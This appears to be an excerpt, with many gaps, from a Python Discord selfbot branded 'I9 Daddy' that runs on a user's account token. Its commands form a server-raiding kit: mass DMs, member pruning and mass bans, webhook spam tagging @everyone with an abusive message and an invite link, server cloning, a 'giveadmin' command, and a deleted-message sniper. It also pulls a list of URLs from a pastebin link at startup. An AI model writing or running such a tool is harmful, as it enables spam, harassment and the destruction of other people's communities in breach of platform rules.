...
import io
os.system("clear")
hajja = requests.get("https://pastebin.com/raw/MRw35yqs").text


hmm = requests.get(hajja).text.strip().split('\n')

tecnoencrypt = input("token:")
prefix = input("prefix:")
headers = {"Authorization": f"{tecnoencrypt}"}

intents = discord.Intents.default()
intents.members = True

client = commands.Bot(command_prefix=prefix, self_bot=True, case_insensitive=True, intents=intents, help_command=None)
...
async def on_ready():
    os.system(
        f"mode 85,20 & title [I9 Daddy SELF BOT] - Connected: {client.user}")
    print(f'''
...
async def utility(ctx):
    ...
    await ctx.reply(content="""
```
I9 Daddy Sb V1 Utility Commands
...
async def botinfo(ctx):
    ...
    await ctx.reply(content="""
```
I9 Daddy Sb V1 Botinfo Information
...
async def massdm(ctx, *, x):
	await ctx.reply("**I9 Daddy SELFBOT MASS DM STARTED**", mention_author=True)
	for channel in client.private_channels:
		try:
			await channel.send(x)
			await ctx.reply(f"**I9 Daddy SELFBOT MASS DM** > {channel}", mention_author=True)
		except:
			continue
...
async def stream(ctx, *, message):
    await ctx.reply("**I9 Daddy SELFBOT | Changing Status To Streaming**", mention_author=True)
...
async def play(ctx, *, message):
    ...
    await ctx.reply("**I9 Daddy SELFBOT | Changing Status To Playing**", mention_author=True)
    await client.change_presence(activity=game) 
    await ctx.reply("Playing Created!", mention_author=True)
    
@client.command(aliases=["watch"])
async def watching(ctx, *, message):
    await ctx.reply("**I9 Daddy SELFBOT | Changing Status To Watching**", mention_author=True)
...
async def listening(ctx, *, message):
    await ctx.reply("**I9 Daddy SELFBOT | Changing Status To Listening**", mention_author=True)
    await client.change_presence(
        activity=discord.Activity(
...
async def stopactivity(ctx):
    await ctx.reply("**I9 Daddy SELFBOT | Removing Status......**", mention_author=True)
    await client.change_presence(activity=None)
    await ctx.reply("**Status Removed Successfully!**", mention_author=True)

@client.command()
async def nickall(ctx, *, name="I9 Daddy#1616 op"):
  print("Nicking All")
...
@client.command()
async def prune(ctx):
    await ctx.reply("**I9 Daddy SELFBOT | pruning...**")
    time.sleep(2)
    await ctx.guild.prune_members(days=1, compute_prune_count=False, roles=ctx.guild.roles)
    time.sleep(1)
    await ctx.reply("**I9 Daddy SELFBOT | Successfully Pruned.**")

@client.command()
async def joinvc(ctx):
    await ctx.reply("**I9 Daddy SELFBOT | Connecting to VC**", mention_author=True)
    channel = ctx.author.voice.channel
    await channel.connect()
    await ctx.reply("**I9 Daddy SELFBOT | SUCCESSFULLY CONNECTED**", mention_author=True)
...
async def botmassban(ctx, pref, timetosleep, guild):
    ...
    with open('members.txt', 'a') as (m):
        ...
        await ctx.reply('**I9 Daddy SELFBOT | BOT MASS BAN \nBanning......**', mention_author=True)
        m.close()
    guild = guild
    print()
...
async def unbanall(ctx):
    ...
    await ctx.reply('**I9 Daddy SELFBOT | Unbanning All**'.format(len(banlist)), mention_author=True)
...
def wspam(webhook):
    while spammingdawebhookeroos:
        ...
        idktopost = f'https://discord.gg/ASVMuGRdRM @everyone fucked by I9 Daddy'
...
async def webhookspam(ctx):
    ...
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='I9 Daddy WAS HERE')
                threading.Thread(target=wspam, args=(webhook.url,)).start()
                f = open('data/webhooks-' + str(ctx.guild.id) + '.txt', 'a')
                f.write(f"{webhook.url} \n")
                f.close()
            except: 
                print(f"{Fore.BLUE} > Rate Limited")
...
async def massban(ctx, guild):
  ...
  guildOBJ = client.get_guild(int(guild))
  members = await guildOBJ.chunk()
  membors = open("I9/Scraped/members.txt")
  
  await ctx.reply("**I9 Daddy SELFB0T | MASS BAN STARTED**")
  try:
      os.remove('I9/Scraped/members.txt')
  except:
      pass
  with open("I9/Scraped/members.txt", 'a') as (scrapedmembers):
       for member in members:
...
title = '''`I9 Daddy`'''
linky = "https://FlameCoderZ.host.xyz/"
footer = "Screenshot"
...
async def snipe(ctx):
    channel = ctx.channel
    try: 
        em = discord.Embed(name = "I9 Daddy  SELFBOT", title="I9 Daddy SELFBOT", description =f"**Message: {snipe_message_content[channel.id]}\nDeleted By: {snipe_message_author[channel.id]}**")
        em.set_footer(text = "Created By I9 Daddy")
...
def chanellsssxd(idofguild,nameofchan):
    try:
        headers = {'Authorization': tecnoencrypt, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
...
async def copy(ctx):
    ...
    extrem_map = {}
    print("I9 Daddy SELFBOT | CLONNING SERVER...")
...
async def giveadmin(ctx):
    ...
    try:
        ...
        print(Fore.MAGENTA + '**I9 Daddy SELFBOT | SUCESSFULLY GIVEN ADMIN**' + Fore.RESET)
    except:
      print(f"'[ERROR]'")
...
async def _first_message(ctx, channel: discord.TextChannel = None):
    ...
    embed.set_footer(text="Created by I9 Daddy")
...
client.run(tecnoencrypt, bot=False)